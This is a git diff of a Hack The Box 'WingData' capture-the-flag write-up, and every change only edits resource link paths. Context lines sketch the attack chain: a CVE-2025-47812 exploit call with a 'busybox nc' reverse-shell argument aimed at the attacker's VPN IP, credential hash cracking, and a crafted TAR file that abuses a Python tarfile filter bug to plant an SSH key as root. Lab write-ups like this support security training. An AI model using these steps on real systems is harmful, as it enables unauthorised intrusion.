@@ -45,7 +45,7 @@ nmap -sC -sV -oA wingdata 10.129.x.x
 
 ```
 
-[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/nmap_results.nmap "Results")
+[Nmap Results](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/nmap_results.nmap "Results")
 
 
 
@@ -73,7 +73,7 @@ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -
 
 ![Wingdata](htb_Wingdata_sudomain.png)
 
-[Subdomain](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/subdomain.txt "Results")
+[Subdomain](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/subdomain.txt "Results")
 
 
 * **Result:** We find `ftp`.
@@ -112,7 +112,7 @@ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c 'busybox nc <YOUR_VPN_IP
 
 ```
 
-[exploit.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/exploit.py "Results")
+[exploit.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/exploit.py "Results")
 
 
 * *Note:* We use `busybox nc` because standard `nc` on minimal Linux distros often lacks the `-e` (execute) flag.
@@ -139,7 +139,7 @@ find /opt/wftpserver -name "*.xml"
 
 ![Wingdata](htb_Wingdata_xml.png)
 
-[wacky.xml](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/wacky.xml "Results")
+[wacky.xml](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/wacky.xml "Results")
 
 ### 3.2 Cracking the Hash
 
@@ -171,7 +171,7 @@ ssh wacky@wingdata.htb
 
 ```
 
-[Hash.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/hash.txt "Results")
+[Hash.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/hash.txt "Results")
 
 ![Wingdata](htb_Wingdata_user_flag.png)
 
@@ -219,7 +219,7 @@ This specific version of Python (3.12.3) has a bug in the `filter="data"` logic.
 
 We write a python script (`payload.py`) to create this "impossible" TAR file.
 
-[payload.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/payload.py "Results")
+[payload.py](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/payload.py "Results")
 
 
 1. **Deep Nesting:** We create a loop to make directories `d/d/d/d...` until we have a path ~4000 chars long.
@@ -233,7 +233,7 @@ We write a python script (`payload.py`) to create this "impossible" TAR file.
 2. **Create TAR:** Update the python script with your new Public Key and run it.
 3. **Transfer:** Upload `backup_1001.tar` to the victim.
 
-[backup_1001.tar](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/backup_1001.tar.zip "Results")
+[backup_1001.tar](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/backup_1001.tar.zip "Results")
 
 
 4. **Trigger:**
@@ -277,7 +277,7 @@ cat /root/root.txt
 
 # Defensive Operations
 
-[Logs.tar.gz](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/Pterodactyl/WingData/Logs.tar.gz "Results")
+[Logs.tar.gz](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/WingData/Logs.tar.gz "Results")
 
 
 ## Startegic Overview
